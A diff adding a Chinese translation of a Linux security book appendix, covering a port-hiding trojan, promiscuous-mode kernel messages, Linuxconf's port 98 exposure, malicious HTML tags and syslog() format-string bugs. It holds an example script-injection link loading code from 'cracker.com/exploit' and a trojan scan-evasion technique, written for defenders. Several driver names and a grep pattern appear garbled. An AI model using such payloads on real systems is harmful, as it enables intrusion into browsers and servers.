@@ -1,0 +1,77 @@
+
+
+不过，有一种简单的方法。不要开放任何端口。这样，你的扫描就不会检测到任何东西，因为没有任何内容可供检测。该木马以 root 身份运行，它只是在已知的时间间隔内短暂开放端口，监听请求，然后关闭端口并回到睡眠状态，除非看到有请求。当攻击者希望木马激活时，她只需在木马预定唤醒的时间点之前，立即开始发送 ICMP 回显回复或类似的包。这可以容忍时钟的微小差异。
+
+从统计上看，前面讨论的脚本恰好在该端口开放的短暂时间内进行扫描的可能性很小。攻击者可能会将你的系统时间同步到方便的互联网原子钟，以便她可以使用更小的时间窗口。如果木马每天在不规律的、只有攻击者知道的时间监测网络一秒，那么每小时一次的 Promiscuous 端口检查器每天检测到这种情况的概率仅为 0.028%。这个问题解决方案将在下一节讨论。
+
+## B.25.3 Promiscuous 模式内核消息
+
+一些以太网卡驱动程序会调用内核日志记录方法之一，以记录当卡片进入 Promiscuous 模式时，但缺乏一致性，并且有些卡片不记录此信息。Linus？如果你的卡不属于这些卡片之一，投入少量精力修改其驱动程序，以便在启动 Promiscuous 模式时调用 *printk*() 可能是值得的。这些驱动程序位于 *drivers/net*。在 2.2.12-20 内核中，消息如下表 B.1 所示。
+
+这些消息可以通过 *syslog* 的日志文件进行扫描，你可以安排通过电子邮件和寻呼机接收通知。这些技术在第 358 页的“Paging the SysAdmin: Cracking in Progress!”中解释。当然，攻击者可以修改内核来绕过这些消息。
+
+## B.26 Linuxconf 通过 TCP 端口 98
+
+![](img/7d04225c75a86d3cf4bd6077596f35b2_602_0.png)
+
+Linuxconf 是 Linux 的一个基于 GUI 的配置工具，允许 SysAdmin 配置网络、打印机服务等事项。除了 root 能够通过命令 *linuxconf* 启动它之外，它还通过 TCP 端口 98 提供 http 请求。它的实现很好，易于使用，并且具有与近期基于 Windows 的配置工具相似的格式，以方便人们过渡到 Linux。在所有已知的发行版中，默认情况下 Linuxconf 配置为*不*监听此端口，因此这种漏洞只有在更改此默认设置时才会发生。
+
+然而，root 可以启用它从指定的系统或网络接受端口 98 上的请求。一旦完成，进行任何所需更改都不需要密码。当然，程序无法检测从该远程系统与其交互的人是否为 root，因此，除非该系统中所有用户都是可信的，否则这是一个漏洞。此外，这使系统容易受到 IP 地址欺骗的攻击。
+
+### 表 B.1 Promiscuous 变体
+
+| 驱动程序文件 | 消息 |
+|---|---|
+| 3c515.c | printk("%s: Setting promiscuous mode.\n", dev->name); |
+| 3c59x.c | printk(KERN_NOTICE "%s: Setting promiscuous mode.\n" |
+| 82596.c | printk("%s: set multicast list, %d entries, promise $s, allmulti $s\n", |
+| ariadne.c and at1700.c | printk("%s: Promiscuous mode enabled.\n", dev->name) |
+| atarirance.c and basterlate.c | DPRINTK ( 1, ( "%s: Promiscuous mode enabled.\n", dev->name ) ); |
+| eepro.c | printk("%s: promiscuous mode enabled.\n", dev->name); |
+| epic100.c | printk(KERN_INFO "%s: Promiscuous mode enabled.\n", dev->name); |
+| lance.c | printk("%s: Promiscuous mode enabled.\n", dev->name); |
+| ni5010.c | PRINTK(KERN_DEBUG "%s: Entering promiscuous mode\n", dev->name)); |
+| ni52.c | printk("%s: switching to promisc. mode\n", dev->name); |
+| pcnet32.c | printk("%s: Promiscuous mode enabled.\n", dev->name); |
+| rt13139_c_sis900_c, via-rhine.c, and yellowfin.c | printk(KERN_NOTICE"%s: Promiscuous mode enabled.\n", dev->name); |
+| tulip.c | printk(KERN_INFO "%s: Promiscuous mode enabled.\n", dev->name); |
+
+接下来，对于某些操作，它会请求 root 的密码。因为它使用的是 http 而不是 https，所以该密码将以明文形式通过网络传输。这使得 root 的密码容易受到嗅探攻击。最后，最近的报告指出，当 Linuxconf 监听 TCP 端口 98 时存在另一种可能的漏洞。目前尚未证明该漏洞。
+
+鉴于这些问题，建议在受保护的网络上禁用网络访问。此外，建议组织的防火墙阻止来自互联网的针对 TCP 端口 98 的请求，以增加“安全环”保护。
+
+## B.27 恶意的 HTML 标签和脚本
+
+危险级别 ☠☠☠
+
+2000 年初，CERT 协调中心报告称，恶意的 HTML 标签或脚本可能会导致入侵 Web 浏览器所在的计算机，甚至攻击其他服务器。可能用于此目的标签包括 <SCRIPT>、<APPLET>、<OBJECT> 和 <EMBED>。
+
+服务器不应接受来自不可信来源的包含这些标签的 HTML。如果可能，在浏览器中禁用这些功能以提高安全性是个非常好的主意。当然，这将结束所有这些很酷的 Java 黑客行为。其他标签，如 <FORM> 标签，也可能被滥用。
+
+典型的攻击如下所示。
+
+```html
+<A HREF="http://pentacorp.com/comment.cgi?mycomment=<SCRIPT SRC='http://cracker.com/exploit'Click for image</A>
+```
+
+从 4.x 版本开始，Netscape 试图通过要求脚本内部的 URL 与包含该脚本的页面在同一系统上来限制这些攻击。大多数主要站点都会过滤掉从站点外部组装数据生成的页面中可能包含的不可信标签。
+
+> 根据 SANS 在 2000 年 3 月 23 日的报告，deja.com 提供的 Usenet 新闻帖子中仍然没有过滤这些可能的攻击。
+
+## B.28 syslog() 的格式问题
+
+![](img/7d04225c75a86d3cf4bd6077596f35b2_605_0.png)
+
+`syslog()` 例程使程序能够生成将被 `syslogd`（标准的 Linux 错误日志记录机制）记录到磁盘的条目。它的第一个参数是优先级，随后的参数解释方式类似于 `printf()` 或 `sprintf()`。对于不变的消息，第二个参数可以是简单的字符串常量。不幸的是，一些标准 Linux 程序反而使用包含任意用户数据的字符串变量作为第二个参数。这个问题是由 Linux 审计项目发现的，该项目肯定会发现其他问题和修复方案；针对 BSD UNIX 代码的类似项目相当成功。
+
+这个问题也可能存在于使用 `printf()` 家族其他变体的特权程序中，包括 `fprintf()`、`sprintf()`，甚至 `v*printf()`。这允许各种攻击，包括缓冲区溢出攻击。熟练的攻击者还可能提供导致任意内存区域（可能包含机密数据）打印到可能对所有人可读的日志文件中的“格式字符串”。目前，受影响程序的名称尚未公开。在系统源代码树的根目录下调用以下 `find` 命令，将找到包含此问题的大多数行；适当的目录通常是 `/usr/src`。
+
+```bash
+find . -name '*. [hc]' -print | xargs -n 50 grep \
+'syslog *([^"]*, *[^"`]) *([^"`])*' /dev/null
+```
+
+如你所见，它找到每个 C 源文件和包含文件（`*. [hc]`）并调用 `grep` 查找其中仅以两个参数调用 `syslog()` 且第二个参数不是字符串字面量的文件。它使用 `xargs` 每 50 个源文件仅 fork 一次 `grep`，而不是每个文件都 fork 一次。这显著提高了性能。
+
+> 已知 `gdm`、`rpc.statd` 和 vopmail 的 `vchkpw`（4.8 版本之前）存在此格式问题。`inn` 程序和其他 RPC 程序也可能存在此问题，其他程序也可能存在。
+
